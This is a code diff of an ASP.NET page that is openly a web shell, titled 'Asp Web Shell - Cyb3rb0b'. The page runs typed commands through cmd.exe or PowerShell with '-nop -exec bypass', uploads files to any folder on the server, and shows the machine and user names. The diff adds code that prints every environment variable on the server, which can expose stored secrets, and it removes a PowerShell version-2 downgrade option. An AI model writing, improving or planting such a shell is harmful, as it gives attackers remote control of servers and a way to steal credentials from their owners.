@@ -1,8 +1,6 @@
 <%@ Page Language="C#" Debug="true" Trace="false" %>
-
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
-
 <html>
 
 <head>
@@ -18,48 +16,36 @@
             color: #FFFFFF;
             overflow: hidden;
         }
-
-        /*@media only screen and (max-width: 600px) {
-            body {
-                background-color: lightblue;
-            }
+        #txtArg{
+            border:1px solid cyan;
         }
-
-        @media only screen and (max-width: 768px) {
-            body {
-                background-color: red;
-            }
+        input{
+            color:black;
         }
-        @media only screen and (min-width: 1200px) {
-            body {
-                background-color: blue;
-            }
-
-        }*/
+       
     </style>
     <title>Asp Web Shell - Cyb3rb0b</title>
-    <%--<style>
-        body {
-            background-color: #012456;
-            color: #FFFFFF;
-            overflow: hidden;
-        }
-    </style>--%>
+   
 </head>
 <script language="c#" runat="server">
+
+  
+
+
     class ExecuteResult
     {
         public bool IsError { get; set; }
         public string Message { get; set; }
     }
 
+  
     void Page_Load(object sender, EventArgs e)
     {
         this.SetFocus(this.txtArg);
         if (!IsPostBack)
         {
             this.setColor();
-
+            string folder = Server.MapPath("~");
             StringBuilder sbl = new StringBuilder();
             sbl.Append("<table>");
             sbl.AppendFormat("<tr><td>Machine Name</td><td> {0}</td></tr>", Environment.MachineName);
@@ -68,7 +54,20 @@
             sbl.AppendLine();
             sbl.AppendFormat("<tr><td>User Domain Name</td><td> {0}</td></tr>", Environment.UserDomainName);
             sbl.AppendLine();
-            sbl.AppendFormat("<tr><td>User Name</td><td> {0}</td></tr></table>", Environment.UserName);
+            sbl.AppendFormat("<tr><td>User Name</td><td> {0}</td></tr>", Environment.UserName);
+            sbl.AppendLine();
+            sbl.AppendFormat("<tr><td>Current Folder</td><td> {0}</td></tr></table>", folder);
+            
+
+
+            IDictionary environmentVariables = Environment.GetEnvironmentVariables();
+            foreach (DictionaryEntry de in environmentVariables)
+            {
+                sbl.AppendLine();
+                sbl.AppendFormat("<tr><td>{0}</td><td> {1}</td></tr></table>", de.Key, de.Value);
+                Console.WriteLine("  {0} = {1}", de.Key, de.Value);
+            }
+
 
             this.dvResult.InnerHtml += sbl.ToString() + "<hr/>";
         }
@@ -93,22 +92,11 @@
 
 
         }
-        else if (this.shelloptions.SelectedValue.Equals("2"))
-        {
-            psi.FileName = "powershell.exe";
-         psi.Arguments = "-nop -exec bypass -version 2" + arg;
-
-        }
-
 
         psi.RedirectStandardOutput = true;
         psi.RedirectStandardError = true;
         psi.UseShellExecute = false;
-
-
         p.StartInfo = psi;
-
-        //p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
         p.Start();
 
         if (psi.FileName == "cmd.exe")
@@ -126,7 +114,7 @@
         {
             myStreamReader.Close();
         }
-        
+
         if (string.IsNullOrEmpty(error))
         {
             result.IsError = false;
@@ -141,26 +129,31 @@
         return result;
     }
 
+    void run(string command)
+    {
+        ExecuteResult result = ExcuteCmd(command);
+        if (!result.IsError)
+        {
+            this.addResult(Server.HtmlEncode(result.Message));
+        }
+        else
+        {
+            this.addResult("<div style='color:red'>" + Server.HtmlEncode(result.Message) + "</div>");
+        }
+    }
+
 
     void cmdExe_Click(object sender, System.EventArgs e)
     {
+
+
         if (this.txtArg.Text.ToLower().Equals("cls"))
         {
             this.dvResult.InnerHtml = string.Empty;
         }
         else
         {
-            ExecuteResult result = ExcuteCmd(txtArg.Text);
-            if (!result.IsError)
-            {
-                this.addResult(Server.HtmlEncode(result.Message));
-            }
-            else
-            {
-                this.addResult("<div style='color:red'>" + Server.HtmlEncode(result.Message) + "</div>");
-            }
-
-
+            this.run(this.txtArg.Text);
         }
 
         this.txtArg.Text = string.Empty;
@@ -212,64 +205,50 @@
         {
             this.directory.Text = Environment.CurrentDirectory + ">";
             this.body.Attributes.Add("style", "background-color:#000000");
-            this.txtArg.Attributes.Add("style", "background-color:#000000;width: 50%;border: 0;color: #FFFF;font-weight: bold;");
+            this.txtArg.Attributes.Add("style", "background-color:#000000;width: 50%;color: #FFFF;font-weight: bold;");
         }
         else
         {
             this.directory.Text = "PS -nop -exec bypass >";
             this.body.Attributes.Add("style", "background-color:#012456");
-            this.txtArg.Attributes.Add("style", "background-color:#012456;width: 50%;border: 0;color: #FFFF;font-weight: bold;");
+            this.txtArg.Attributes.Add("style", "background-color:#012456;width: 50%;color: #FFFF;font-weight: bold;");
 
         }
     }
+
+    
 </script>
 <body id="body" runat="server">
 
 
    
     <form id="cmd" method="post" runat="server">
-<a class="menu-bar" data-toggle="collapse" href="#menu">
-
-    Options
-            <span class="bars"></span>            
-        </a>
-        <div class="collapse menu" id="menu">
-            <ul class="list-inline">
-                <li><a href="#">Home</a></li>
-                <li><a href="#">About</a></li>
-                <li><a href="#">Services</a></li>
-                <li><a href="#">Works</a></li>
-                <li><a href="#">Contact</a></li>
-            </ul>   
-        </div>
+        
+        
 
         <div style="overflow: auto; height: 90%">
             <div id="upload" runat="server" visible="false">
                 <asp:FileUpload ID="file" runat="server" />
                 <asp:Label ID="lblTo" runat="server" Text="Destination Folder"></asp:Label>
                 <asp:TextBox ID="txtTo" runat="server" style="color:black"></asp:TextBox>
-                <asp:Button ID="uploadcmd" runat="server" Text="Upload" OnClick="uploadcmd_Click" Enabled="false" />
-
+                <asp:Button ID="uploadcmd" runat="server" Text="Upload"  style="color:black" OnClick="uploadcmd_Click" Enabled="false" />
+                
             </div>
             <pre id="dvResult" style="background-color:#000000;color:#FFF"  runat="server" class="">
-           
-
-        </pre>
+            </pre>
         </div>
+
 
         <div style="position: absolute; bottom: 0; width: 100%; left: 0; border: none">
             <asp:Label ID="directory" runat="server"></asp:Label>
-            <asp:TextBox ID="txtArg" runat="server" Style="width: 50%; border: 0; color: #FFFF; font-weight: bold;"></asp:TextBox>
+            <asp:TextBox ID="txtArg" runat="server" Style="width: 50%; color: #FFFF; font-weight: bold;"></asp:TextBox>
             <asp:Button ID="testing" cssClass="btn btn-warning btn-sm" runat="server" Text="..." OnClick="cmdExe_Click"></asp:Button>
             <asp:Button cssClass="btn btn-success btn-sm" ID="uploadfile" runat="server" Text="Upload File" OnClick="uploadfile_Click" />
-            <asp:DropDownList ID="shelloptions" runat="server" OnSelectedIndexChanged="shelloptions_SelectedIndexChanged" AutoPostBack="true">
+            <asp:DropDownList ID="shelloptions" runat="server" OnSelectedIndexChanged="shelloptions_SelectedIndexChanged" AutoPostBack="true" style="background-color:red">
                 <asp:ListItem Text="Cmd" Value="0"></asp:ListItem>
                 <asp:ListItem Text="PowerShell" Value="1"></asp:ListItem>
-                <asp:ListItem Text="PowerShell V2" Value="2"></asp:ListItem>
             </asp:DropDownList>
         </div>
-
-
 
     </form>
 </body>
